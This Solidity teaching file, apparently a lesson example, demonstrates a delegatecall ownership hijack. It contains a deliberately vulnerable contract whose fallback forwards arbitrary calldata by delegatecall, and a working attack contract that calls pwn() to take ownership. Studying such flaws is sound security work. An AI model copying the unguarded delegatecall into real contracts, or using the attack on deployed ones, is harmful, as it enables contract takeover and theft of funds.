// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
HackMe is a contract that uses delegatecall to execute code.
It it is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let's see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe
*/

contract LibDelegatecall {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMeDelegatecall {
    address public owner;
    LibDelegatecall public lib;

    constructor(LibDelegatecall _lib) {
        lib = LibDelegatecall(_lib);
        owner = msg.sender;
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract AttackDelegatecall {
    address public hackme;

    constructor(address _hackme) {
        hackme = _hackme;
    }

    function attack() public {
        hackme.call(abi.encodeWithSignature("pwn()"));
    }
}
